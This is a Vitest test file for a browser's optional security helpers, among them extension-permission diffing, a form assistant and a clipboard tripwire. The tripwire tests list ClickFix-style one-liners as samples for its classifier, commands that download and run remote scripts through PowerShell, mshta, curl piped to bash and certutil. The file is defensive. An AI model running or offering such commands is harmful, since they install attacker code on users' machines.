// @vitest-environment jsdom
//
// Wave 3 security helpers: the pure parts of each module, the page-side clipboard shim, and the
// wiring (manifests, usage rows, script tags). Every helper is off until switched on.
import { describe, it, expect, beforeEach } from 'vitest';
const fs = require('fs');
const path = require('path');
const JS = '../../src/renderer/js/';
const ROOT = path.resolve(__dirname, '../..');
const { VexGuest } = require(JS + 'guest-session.js');
const { VexExtDiff } = require(JS + 'extension-diff.js');
const { VexClipboardTripwire: CT } = require(JS + 'clipboard-tripwire.js');
const { VexStartupCheck } = require(JS + 'startup-check.js');
const { VexSecureLock } = require(JS + 'secure-lock.js');
const { VexSlotWatcher: SW } = require(JS + 'slot-watcher.js');
const { VexPhotoPrep: PP } = require(JS + 'photo-prep.js');
const { VexFormAssist: FA } = require(JS + 'form-assist.js');

beforeEach(() => localStorage.clear());

describe('all off by default', () => {
  it('every helper starts switched off', () => {
    for (const m of [VexGuest, VexExtDiff, CT, VexStartupCheck, VexSecureLock, SW, PP, FA]) expect(m.enabled()).toBe(false);
  });
});

describe('guest session', () => {
  it('receipt and hosts', () => {
    expect(VexGuest.hostsOf(['https://www.a.com/x', 'https://a.com/y', 'http://b.org', 'file:///c', 'junk'])).toEqual(['a.com', 'b.org']);
    expect(VexGuest.receipt({ tabs: 1, hosts: ['a.com'] })[0]).toBe('1 open tab');
    expect(VexGuest.receipt({ tabs: 3, hosts: [] })[1]).toBe('0 sites visited in this window');
  });
  it('refuses to open while off', async () => { await expect(VexGuest.open()).rejects.toThrow(/switched off/); });
});

describe('extension diff', () => {
  const ext = (o) => ({ folder: 'f', name: 'X', version: '1', audit: { reach: { level: 'some', hosts: ['a.com'] }, powers: [{ id: 'tabs', says: 'See tabs', heavy: true }] }, ...o });
  it('reports powers, reach and hosts that changed, in words', () => {
    const a = VexExtDiff.snapshotOf(ext());
    const b = VexExtDiff.snapshotOf(ext({ version: '2', audit: { reach: { level: 'all', hosts: [] }, powers: [{ id: 'cookies', says: 'Read cookies', heavy: true }] } }));
    const d = VexExtDiff.diff(a, b);
    expect(d.changed).toBe(true);
    expect(d.gained.map(p => p.id)).toEqual(['cookies']);
    expect(d.lost.map(p => p.id)).toEqual(['tabs']);
    expect(d.reach.wider).toBe(true);
    expect(d.hostsRemoved).toEqual(['a.com']);
    expect(VexExtDiff.lines(d).join('|')).toMatch(/Version 1 to 2.*Now can: Read cookies/);
    expect(VexExtDiff.diff(a, a).changed).toBe(false);
  });
  it('knows which extensions read a host', () => {
    const some = VexExtDiff.snapshotOf(ext());
    expect(VexExtDiff.readsHost(some, 'www.a.com')).toBe(true);
    expect(VexExtDiff.readsHost(some, 'sub.a.com')).toBe(true);
    expect(VexExtDiff.readsHost(some, 'b.com')).toBe(false);
    expect(VexExtDiff.readsHost({ level: 'all', hosts: [] }, 'b.com')).toBe(true);
    expect(VexExtDiff.readsHost({ level: 'click', hosts: [] }, 'b.com')).toBe(false);
    expect(VexExtDiff.SENSITIVE.test('mail.google.com')).toBe(true);
  });
  it('first sight stores a baseline and reports nothing', async () => {
    localStorage.setItem(VexExtDiff.ENABLED_KEY, 'true');
    const rows = await VexExtDiff.review({ list: [ext()] });
    expect(rows[0].change).toBeNull();
    const again = await VexExtDiff.review({ list: [ext({ version: '3' })] });
    expect(again[0].change.version).toEqual(['1', '3']);
  });
  it('pause remembers exactly what it switched off and restore switches those on', async () => {
    localStorage.setItem(VexExtDiff.ENABLED_KEY, 'true');
    const calls = [];
    window.vex = { extensionsSetEnabled: async (f, on) => { calls.push([f, on]); return { ok: true }; } };
    await VexExtDiff.pause('bank.com', ['a', 'b']);
    expect(VexExtDiff.pausedHosts()).toEqual(['bank.com']);
    await VexExtDiff.restore('bank.com');
    expect(calls).toEqual([['a', false], ['b', false], ['a', true], ['b', true]]);
    expect(VexExtDiff.pausedHosts()).toEqual([]);
    delete window.vex;
  });
});

describe('paste-and-run tripwire classifier', () => {
  it('flags ClickFix-style one-liners', () => {
    for (const t of [
      'powershell -w hidden -c "iwr http://x.y/a.ps1 | iex"',
      'mshta https://evil.example/a.hta',
      'cmd /c start /min powershell -enc ' + 'A'.repeat(40),
      'curl -s http://x.y/i.sh | bash',
      'powershell -nop -ep bypass -c "irm x.y | iex"',
      'certutil -urlcache -f http://x.y/a.exe a.exe',
    ]) expect(CT.classify(t), t).not.toBeNull();
  });
  it('leaves ordinary commands alone', () => {
    for (const t of ['npm install zod', 'pnpm add -D vitest', 'Get-ChildItem -Recurse', 'git clone https://github.com/a/b', 'hello world, this is a sentence', 'curl https://example.com -o a.txt', 'winget install Git.Git']) expect(CT.classify(t), t).toBeNull();
  });
  it('does nothing when off, and never stores the command text', () => {
    const wv = { getURL: () => 'https://site.example/' };
    expect(CT.fromTab(wv, { text: 'mshta https://e.x/a.hta', host: 'site.example' })).toBe(false);
    localStorage.setItem(CT.ENABLED_KEY, 'true');
    CT._last.clear();
    expect(CT.fromTab(wv, { text: 'mshta https://e.x/a.hta', host: 'site.example' })).toBe(true);
    expect(CT.fromTab(wv, { text: 'mshta https://e.x/a.hta', host: 'site.example' })).toBe(false);
    CT._record({ host: 'h', kind: 'mshta', did: 'kept' });
    expect(localStorage.getItem(CT.LOG_KEY)).not.toMatch(/a\.hta|e\.x/);   // the kind 'mshta' is kept, the command and its address are not
  });
});

describe('the page-side clipboard shim', () => {
  const src = fs.readFileSync(path.join(ROOT, 'src/preload-webview.js'), 'utf8');
  const shim = src.slice(src.indexOf('Paste-and-run tripwire')).match(/const shimSrc = `([\s\S]*?)`;/)[1];
  function run(active) {
    const sent = [];
    const written = [];
    Object.defineProperty(navigator, 'userActivation', { value: { isActive: active }, configurable: true });
    Object.defineProperty(navigator, 'clipboard', { value: { writeText: (t) => { written.push(t); return Promise.resolve(); } }, configurable: true });
    new Function('bridge', shim)({ written: (t, how) => sent.push([t, how]) });
    navigator.clipboard.writeText('mshta http://x');
    return { sent, written };
  }
  it('reports a write with no user activation, and still lets it through', () => {
    const r = run(false);
    expect(r.sent).toEqual([['mshta http://x', 'clipboard.writeText']]);
    expect(r.written).toEqual(['mshta http://x']);
  });
  it('does not report a write made during a click or key press', () => {
    const r = run(true);
    expect(r.sent).toEqual([]);
    expect(r.written).toEqual(['mshta http://x']);
  });
});

describe('startup check grouping', () => {
  it('Vex first, then new, then the rest; the first look flags nothing', () => {
    const items = [{ id: 'a', vex: true }, { id: 'b' }, { id: 'c' }];
    const g = VexStartupCheck.group(items, ['b']);
    expect(g.vex.map(i => i.id)).toEqual(['a']);
    expect(g.fresh.map(i => i.id)).toEqual(['c']);
    expect(g.other.map(i => i.id)).toEqual(['b']);
    expect(VexStartupCheck.group(items, null).fresh).toEqual([]);
  });
});

describe('secure lock', () => {
  it('checks a new secret', () => {
    expect(VexSecureLock.secretProblem('4821')).toBe('');
    expect(VexSecureLock.secretProblem('a good passphrase')).toBe('');
    expect(VexSecureLock.secretProblem('123')).toMatch(/at least 8/);
    expect(VexSecureLock.secretProblem('1234567890123')).toMatch(/4 to 12 digits/);
  });
  it('the lock screen gets the reset only when the extras are on, and the button needs the exact phrase', async () => {
    const screen = document.createElement('div');
    expect(VexSecureLock.decorateLockScreen(screen)).toBeNull();
    localStorage.setItem(VexSecureLock.ENABLED_KEY, 'true');
    const w = VexSecureLock.decorateLockScreen(screen);
    const input = w.querySelector('input'), btn = w.querySelector('button');
    expect(btn.disabled).toBe(true);
    input.value = 'erase secure data'; input.dispatchEvent(new Event('input'));
    expect(btn.disabled).toBe(true);
    input.value = VexSecureLock.PHRASE; input.dispatchEvent(new Event('input'));
    expect(btn.disabled).toBe(false);
    await expect(VexSecureLock.reset('nope')).rejects.toThrow(/exactly/);
  });
});

describe('slot watcher judgement', () => {
  const entry = { available: ['müsait', 'available'], none: ['no appointments'] };
  it('open when an open word is among the new lines', () => {
    expect(SW.judge(entry, ['Tarih: 12 Kasim MÜSAIT'], []).open).toBe(true);
    expect(SW.judge(entry, ['Footer updated'], []).open).toBe(false);
  });
  it('open when the "nothing" message went away, not when it merely moved', () => {
    expect(SW.judge(entry, ['Choose a day'], ['No appointments available now']).open).toBe(true);
    expect(SW.judge({ ...entry, available: ['zzz'] }, ['No appointments'], ['No appointments']).open).toBe(false);
  });
  it('rejects logins in the address and too-frequent checks', () => {
    expect(() => SW.checkUrl('https://u:p@x.com/')).toThrow(/public pages only/);
    expect(SW.checkUrl('https://x.com/a')).toBe('https://x.com/a');
    expect(SW.cleanWords('a, b;a')).toEqual(['a', 'b']);
  });
});

describe('photo preparer plan', () => {
  it('cover crops evenly to the requested ratio', () => {
    expect(PP.plan(4000, 3000, { width: 413, height: 531, fit: 'cover' })).toEqual({ sx: 834, sy: 0, sw: 2333, sh: 3000, dw: 413, dh: 531 });   // 3000 * 413/531 = 2333.2; (4000 - 2333) / 2 = 833.5 rounds to 834
  });
  it('contain never enlarges and keeps the ratio', () => {
    expect(PP.plan(4000, 3000, { maxSide: 1600, fit: 'contain' })).toMatchObject({ dw: 1600, dh: 1200, sx: 0 });
    expect(PP.plan(800, 600, { maxSide: 1600, fit: 'contain' })).toMatchObject({ dw: 800, dh: 600 });
    expect(() => PP.plan(0, 5, { maxSide: 10 })).toThrow();
  });
  it('finds the best quality under the limit, and says when none fits', async () => {
    const enc = async (q) => ({ size: Math.round(q * 1000) });
    const r = await PP.fitQuality(enc, 500);
    expect(r.result.size).toBeLessThanOrEqual(500);
    expect(r.quality).toBeGreaterThan(0.45);
    await expect(PP.fitQuality(enc, 100)).rejects.toThrow('smaller-needed');
    expect(PP.outName('My Photo.HEIC.jpeg', 'jpeg')).toBe('My_Photo.HEIC-prepared.jpg');
  });
});

describe('form assistant', () => {
  const f = (o) => ({ i: 0, tag: 'input', type: 'text', name: '', id: '', ac: '', label: '', ph: '', aria: '', hasValue: false, ...o });
  it('never proposes passwords, cards, codes or ID numbers', () => {
    for (const o of [{ type: 'password' }, { ac: 'cc-number' }, { name: 'cvv' }, { ac: 'one-time-code' }, { label: 'T.C. Kimlik No' }, { name: 'iban' }, { label: 'SMS code' }]) {
      expect(FA.classify(f(o)).cls, JSON.stringify(o)).toMatch(/^sensitive:/);
    }
    const rows = FA.propose([f({ type: 'password', i: 1 })], { fullName: 'A B' });
    expect(rows[0]).toMatchObject({ state: 'sensitive', value: '' });
  });
  it('proposes from the profile, skips boxes already filled, and says when nothing is saved', () => {
    const rows = FA.propose([f({ i: 0, type: 'email' }), f({ i: 1, ac: 'given-name' }), f({ i: 2, name: 'city', hasValue: true }), f({ i: 3, ac: 'postal-code' })], { email: 'a@b.c', fullName: 'Ada Lovelace' });
    expect(rows.map(r => r.state)).toEqual(['propose', 'propose', 'filled', 'no-fact']);
    expect(rows[1].value).toBe('Ada');
  });
  it('the fill script refuses a moved or full box and never submits or clicks', () => {
    const row = { idx: 2, sig: 'input|text|city|' };
    const js = FA.fillScript(row, 'x"y');
    expect(js).toContain("return 'moved'");
    expect(js).toContain("return 'full'");
    for (const bad of ['.submit(', '.click(', 'requestSubmit', 'fetch(', 'XMLHttpRequest']) expect(js.includes(bad) || FA.SCAN_JS.includes(bad), bad).toBe(false);
    expect(FA.pageOk('https://a.com')).toBe(true);
    expect(FA.pageOk('http://a.com')).toBe(false);
  });
});

describe('wiring', () => {
  const IDS = ['guest-session', 'extension-diff', 'clipboard-tripwire', 'startup-check', 'secure-lock', 'slot-watcher', 'photo-prep', 'form-assist'];
  it('each has a manifest (staged off in every tier), a usage row and a script tag', () => {
    const { VexRegistry } = require(JS + 'feature-registry.js');
    globalThis.VexRegistry = VexRegistry;
    delete require.cache[require.resolve(JS + 'feature-manifests.js')];
    require(JS + 'feature-manifests.js');
    const { VexUsageRegistry } = require(JS + 'vex-usage-registry.js');
    const rows = new Set(VexUsageRegistry.table().map(([id]) => id));
    const html = fs.readFileSync(path.join(ROOT, 'src/renderer/index.html'), 'utf8');
    for (const id of IDS) {
      expect(VexRegistry.get(id).maturity, id).toBe('new');
      expect(VexRegistry.tierDefault(id, 'standard'), id).toBe(false);
      expect(rows.has(id), id + ' row').toBe(true);
    }
    for (const f of ['guest-session', 'extension-diff', 'clipboard-tripwire', 'startup-check', 'secure-lock', 'slot-watcher', 'photo-prep', 'form-assist']) expect(html).toContain('js/' + f + '.js');
  });
});
